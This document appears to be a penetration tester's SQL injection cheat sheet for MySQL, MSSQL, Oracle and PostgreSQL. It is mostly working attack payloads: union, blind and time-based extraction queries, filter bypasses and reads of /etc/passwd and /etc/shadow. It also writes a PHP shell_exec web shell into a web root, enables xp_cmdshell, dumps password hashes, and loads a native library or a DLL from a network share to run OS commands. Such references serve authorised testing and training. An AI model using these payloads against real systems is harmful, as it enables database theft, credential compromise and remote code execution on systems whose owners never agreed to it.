---
title: SQL Injection
category: Web Application
order: 5
---

> **SQL Injection: Test Location and Strings**

**Pull usernames and passwords if successful**

**Test Locations:**
* GET URL query parameters
* POST parameters
* Cookie (session information)
* User-Agent

**Visable Test Strings:**
{% highlight bash %}
' ` " ; /* --
{% endhighlight %}

**Methodology***

1. Determine injection point and how to break out:

{% highlight sql %}

SELECT info From users WHERE id = [UserInput]
SELECT info From users WHERE id = ' [UserInput] '
SELECT info From users WHERE id = " [UserInput] "
SELECT info From users WHERE (type='admin' AND id = [UserInput])

{% endhighlight %}

2. Use test strings like:

{% highlight sql %}

SELECT info From users WHERE id = 1
SELECT info From users WHERE id = -9999
SELECT info From users WHERE id = 1 AND 1=1
SELECT info From users WHERE id = 1 AND 'a'='a
SELECT info From users WHERE id = 1 AND 1=2
{% endhighlight %}

3. Exfiltration:

{% highlight sql %}
MySQL: 0 Union SELECT 'data' LIMIT [offset], [rows]
MSSQL: 0 UNION SELECT TOP [r] 'data' WHERE data_column not in (SELECT TOP [offset] 'data')
{% endhighlight %}

4. Error Based Exfiltration:

{% highlight sql %}
MYSQL: 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT '[data]'), FLOOR(RAND(0)*2)) x from users group by x) a)
MSSQL: 1 and 1=convert(int, (SELECT '[data]'))
{% endhighlight %}

4. Boolean Based Exfiltration:

{% highlight sql %}
--Known data
if (((SELECT 'data') = 'password'), 1, 0)

--Binary Search Tree
MySQL: 1 AND ASCII(MID((SELECT 'data'),[c],1))>79
MSSSQL: 1 AND ASCII(SUBSTRING((SELECT 'data'),[c],1))>79

{% endhighlight %}

5. Timing based QUERY:

{% highlight sql %}
MySQL: IF ([condition], SLEEP([s]), 0)
MSSQL: 1 IF ([condition]) WAITFOR DELAY '0:0:[s]'
{% endhighlight %}

6. Side Channel

* Use file /OS operations to write to web root
* Write output to Samba file share

**Blind Test Strings:**

*Try the following to see if it provides valid results for text that was interpreted:*

Commenting out the end | <code> Brent' ;# <br> Dent' ;-- <br> Dent' ;-- - </code>
Commenting with semicolon | <code> Brent' or 29=29; # <br> Dent' or 29=29;-- <br> Dent' or 29=29;-- - </code>
Commenting without semicolon | <code> Brent' or 1=1 # <br> Dent' or 1=1-- <br> Dent' or 1=1-- - </code>
Inline Commenting | <code> Bre'/* */'nt </code>
Concatenation | <code> De''nt <br> De'||'nt </code>
Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
Sleep MySQL | <code> Sleep(10) </code>
Sleep MySQL2 | <code> id=1-sleep(10)  </code>
Sleep MySQL3 | <code> and (select Sleep(10) =0) </code>
Sleep MSSQL | <code> WAITFOR DELAY '0:0:10'  MSSQL </code> 

Math | <code> id=1-0 </code>


Determine the level of blindness:
{% highlight sql %}
Dent' AND 1;#
Dent' AND 1=1;#

Dent' AND 0;#
Dent' AND 1=0;#
#Look for differences
{% endhighlight %}

> **Online Tool to test syntax***

* [sqlfiddle](http://sqlfiddle.com/#!9/a6c585/51364)

> **SQL Injection: Database Identification**

MS SQL Server | Incorrect syntax near 'something'
MS SQL Server | <code> 'De'+'nt' </code>
MS SQL Server | <code> SELECT @@version  </code>
MS SQL Server | <code> @@pack_received </code>
MySQL | 'De' 'nt'
MySQL | <code> SELECT @@version  </code>
MySQL | <code> connection_id() </code>
Oracle | ORA-01756: quoted string not properly terminated
Oracle | <code> 'De'||'nt' </code>
Oracle | <code> BITAND(1,1) </code>
PostgreSQL | 5-digit Hex Error Code

> **SQL Injection: Database, Table, and Columns**

**MySQL:**

Database | schema_name FROM information_schema.schemata 
Table | table_name FROM information_schema.tables
Table from DB | table_name FROM information_schema.tables where table_schema='your_database_name'
Columns | column_name From information_schema.columns where table_name='users'

**SQL Server:**

Database | name FROM sys.databases 
Table | name FROM sys.tables 
Columns | name FROM sys.coumns

**Oracle DB:**

Database | owner FROM all_tables 
Table | table_name FROM all_tables 
Columns | column_name FROM all_tab_columns

> **SQL Injection Filter Bypass**

UTF-16 URL encoding for select and union:
MySQL will map the most unicode characters
%u0055Nion %u0053elect
websec.github.io/unicode-security-guide/character-transformations/

Spaces:
union/**/select

Escaping Escapted Quotes (Single and Double):
{% highlight sql %}
313372, pd_description = (select schema_name FROM information_schema.schemata limit 1,1 union select LOAD_FILE(0x002F6574632F736861646F77) INTO outfile QUOTE(test.txt) limit 1,1), pd_description=QUOTE(1)

select 0x002F6574632F736861646F77
{% endhighlight %}

Functions:
char() and hex()

Postgress bypass single quote (') restriction:
{% highlight sql %}
select $TAG$text$TAG$
select $$text$$
{% endhighlight %}

Try SQLMap tamper scripts


> **SQL Injection Union**

1) Once you have identified SQL injection, use order by or UNION select to determine the number of columns:
{% highlight sql %}
dent' and 'a'='a' ORDER BY 1; #
...until it breaks
dent' and 'a'='a' ORDER BY 5; #

Dent' UNION SELECT  NULL; #
..until it works
Dent' UNION SELECT  NULL, NULL, NULL, NULL; #
{% endhighlight %}

2) See which columns (e.g., numbers) are visable and correct data type (e.g., String/varchar) in the output. 
{% highlight sql %}
Dent' UNION SELECT  'X3Y2Z1', NULL, NULL, NULL; #
...until it works and visable in source (search for X3Y2Z1)
Dent' UNION SELECT  NULL, NULL, NULL, 'X3Y2Z1'; #
{% endhighlight %}

3) From the columns identified above, use one for the union. <br> *Note: It requires the same number of columns and compatable data type*
{% highlight sql %}
Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
<br>
id=738 union select 1,2,3,null, table_name,5 FROM information_schema.tables where table_schema='webappdb';#
<br>
or use NULL since it is compatable with everything
<br>
Dent' UNION SELECT NULL, NULL, NULL;--
<b>
jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts;+--+
{% endhighlight %}

> **Blind SQL Injection Data Exfiltration**

Perform a binary search tree using substr: 

{% highlight sql %}
#Use
substr(([Query]),[Letter],[Word]) > "m"

substr((select table_name from information_schema.tables limit 1),1,1) > "m"
…
= "c"

{% endhighlight %}

Postgres Exfiltration:
{% highlight sql %}
select case when(ascii(substr((select content from read_file)1,1))=97) then pg_sleep(5) end;
{% endhighlight %}

> **Stacked Queries**

Allows multiple commands with a ';'  (Mostly MSSQL):
{% highlight sql %}
Dent' ;  CREATE TABLE exfil(data varchar(1000));-- 
{% endhighlight %}


> **Reading and Writing Files**

MySQL Reading:
{% highlight sql %}
Dent'+UNION+SELECT++'1'%2C+'2'%2C+'3'%2C+LOAD_FILE("%2Fetc%2Fpasswd")%3B+%23
{% endhighlight %}

MySQL Writing:
{% highlight sql %}
INTO OUTFILE 
http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
{% endhighlight %}

SQL Server Reading: 
{% highlight sql %}
BULK INSERT
{% endhighlight %}

Postgress write file:
{% highlight sql %}
select * from temptable; --make sure it doesn't exist
CREATE TEMP TABLE temptable (content text); INSERT INTO temptable(anyname) VALUES (chr(119)||chr(48)||chr(116));
COPY temptable(name) to $$C:\test.txt$$

--another way
copy (select $$text$$) to $$c:\test.txt$$;
copy (select convert_from(decode($$ENCODED_TEXT$$,$$base64),$$utf-8$$)) to $$C:\\folder\sub folder\file$$

--verify it was written
select * from temptable; --make sure it doesn't exist
CREATE TEMP TABLE temptable (content text); 
COPY temptable from $$c:\users\public\test.txt$$;
select case when(ascii(substr((select content from temptable)1,1))=116) then pg_sleep(5) end;

{% endhighlight %}

Postgress read file:
{% highlight sql %}
select * from temptable; --make sure it doesn't exist
CREATE TEMP TABLE temptable (content text); 
COPY temptable from $$c:\users\public\test.txt$$;
select * from temptable;
select case when(ascii(substr((select content from temptable)1,1))=97) then pg_sleep(5) end;
{% endhighlight %}

> **MSSQL Enable xp_cmdshell, exploit, and exfil**

{% highlight sql %}
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
exec master..xp_cmdshell 'dir c:'; --
RECONFIGURE;
{% endhighlight %}

{% highlight sql %}
\\get database version
select @@version
\\get usernames and password hashes
SELECT name, password FROM master..sysxlogins
\\get databases
SELECT name FROM master..sysdatabases
use [db]
\\select tables from current db
SELECT name FROM sysobjects WHERE xtype = 'U'
\\Select tables from a database (eg msdb)
SELECT name FROM [db]..sysobjects WHERE xtype = 'U'
\\Select everything from table
SELECT * from [tablename]
{% endhighlight %}

> **Postgres run Commands**

In bash:

{% highlight bash %}
nano /etc/apt/sources.list (add the following)
deb http://apt.postgresql.org/pub/repos/apt/ bionic-pgdg main
wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -
apt install postgresql postgresql-server-dev-10
wget https://raw.githubusercontent.com/sqlmapproject/udfhack/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c
gcc -Wall -I/usr/include/postgresql/10/server  -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
strip -sx lib_postgresqludf_sys.so
mv lib_postgresqludf_sys.so /tmp/
split -b 2048 lib_postgresqludf_sys.so
{% endhighlight %}

In postgres: 

{% highlight sql %}
--Verify permissions 
SELECT case when (select current_setting($$is_superuser$$))=$$on$$ then pg_sleep(5) end;

SELECT lo_creat(-1);

set c0 `base64 -w 0 /tmp/xaa`
...
set c5 `base64 -w 0 /tmp/xaf`

 INSERT INTO pg_largeobject (loid, pageno, data) values ([number from lo_creat], 0, decode(:'c0', 'base64'));
 ...
 INSERT INTO pg_largeobject (loid, pageno, data) values ([number from lo_creat], 5, decode(:'c5', 'base64'));

SELECT lo_export([number from lo_creat], '/tmp/lib_postgresqludf_sys.so');

CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE OR REPLACE FUNCTION sys_bineval(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_bineval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE OR REPLACE FUNCTION sys_fileread(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_fileread' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;

--Example commands
SELECT sys_eval('pwd');
SELECT sys_exec('touch /tmp/test_postgresql');
{% endhighlight %}


In postgres (2nd way): 

{% highlight sql %}
--compile example DLL (see script/web/postgresmodule.c) and upload it to the machine or accessable network share

--check for function first
\df test

--Create function from compiled DLL (see script/web/postgresmodule.c)
create or replace function test(text, integer) returns void as $$c:\compiled.dll$$, $$awae$$ LANGUAGE C STRICT;
create or replace function test(text, integer) returns void as $$//192.168.1.29/impk_share/compiled.dll$$, $$awae$$ LANGUAGE C STRICT;

--execute
select test($$calc.exe$$, 3);

--remove function
drop function test(text, integer);
{% endhighlight %}


> **SQL Injection Cheat Sheets**

* [websec](https://websec.ca/kb/sql_injection)
* [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [SQLInjection Wiki](http://www.sqlinjectionwiki.com)

